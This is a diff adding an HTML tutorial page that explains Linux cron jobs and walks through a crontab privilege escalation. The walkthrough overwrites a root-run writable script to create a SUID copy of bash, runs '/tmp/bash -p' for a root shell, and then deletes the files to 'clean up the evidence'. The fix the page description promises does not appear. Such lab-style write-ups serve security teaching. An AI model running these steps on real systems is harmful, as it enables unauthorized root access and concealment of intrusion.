@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Cron Job Misconfigurations - Rare Code Base</title>
+
+    <meta name="description"
+        content="Understand how Cron Job misconfigurations can lead to privilege escalation in Linux systems. Explore real-world examples and step-by-step methods to identify and fix these vulnerabilities to prevent unauthorized access.">
+    <meta name="keywords"
+        content="Cron Job misconfigurations, privilege escalation, Linux privilege escalation, Cron Job exploitation, Linux security vulnerabilities, Cron Job attacks, escalation through Cron, Linux root access, privilege escalation techniques, ethical hacking, Linux sysadmin">
+
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+    <script src="/js/main.js" defer></script>
+    <script src="/js/sidebar.js" defer></script>
+</head>
+
+<body>
+
+    <div id="navbar-placeholder"></div>
+
+    <main class="d-lg-flex flex-nowrap d-block">
+        <div id="sidebar-placeholder"></div>
+
+        <div class="content p-4">
+            <h1 class="mt-4">Linux Crontab Privilege Escalation</h1>
+
+            <p>
+                In Linux, <strong>cron jobs</strong> are scheduled tasks that automatically run at specified times.
+                These tasks are defined in files called <code>crontabs</code>. Each user, including root, can have
+                their own crontab file.
+            </p>
+
+            <h3 class="mt-5">What is Crontab?</h3>
+            <p>
+                Crontab stands for "cron table" – a file that lists commands to be executed at scheduled intervals.
+                The cron service reads this file and runs the defined commands.
+            </p>
+            <p><strong>Location:</strong> System-wide cron jobs are usually found in <code>/etc/crontab</code></p>
+
+            <pre><code>cat /etc/crontab</code></pre>
+
+            <p>Sample output:</p>
+
+            <img src="images/crontab-file.png" alt="System-wide crontab file" />
+
+            <h3 class="mt-5">Why This Can Be Dangerous</h3>
+            <p>
+                Cron jobs run with the privileges of the user who owns them. In this case,
+                <code>/home/karen/backup.sh</code> is being run as root.
+                If this script is writable by a normal user, it opens up a serious privilege escalation vulnerability.
+            </p>
+            <p>
+                Since the script is writable, an attacker can inject malicious commands that will be executed with root
+                privileges.
+                For example, the attacker can add a command to create a root shell with SUID permissions.
+            </p>
+
+            <h3 class="mt-5">Exploitation</h3>
+
+            <p>Inject the following code into <code>/home/karen/backup.sh</code>:</p>
+            <pre><code>$ echo '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod +s /tmp/bash' > /home/karen/backup.sh
+$ chmod +x /home/karen/backup.sh</code></pre>
+
+            <p>Now, wait for cron to run (usually within 1 minute), then check:</p>
+            <pre><code>$ ls -l /tmp/bash</code></pre>
+            <p>You should see something like:</p>
+            <pre><code>-rwsr-xr-x 1 root root ... /tmp/bash</code></pre>
+
+            <img src="images/root-shell.png" alt="Got root shell using bash -p" />
+
+            <p>Run the SUID shell to gain root access:</p>
+            <pre><code>$ /tmp/bash -p
+$ whoami</code></pre>
+            <p><strong>Output:</strong> <code>root</code></p>
+
+            <h4 class="mt-4">Cleanup</h4>
+            <p>After gaining access and completing your task, clean up the evidence:</p>
+            <pre><code>$ rm /tmp/bash
+$ rm /home/karen/backup.sh</code></pre>
+
+            <h3 class="mt-5">Summary</h3>
+            <ul>
+                <li><code>/home/karen/backup.sh</code> is executed by root via cron</li>
+                <li>The file is writable by a normal user</li>
+                <li>Injected script creates a SUID root shell</li>
+                <li><code>/tmp/bash -p</code> gives full root access</li>
+            </ul>
+        </div>
+
+
+
+    </main>
+
+    <div id="footer-placeholder"></div>
+
+</body>
+
+</html>
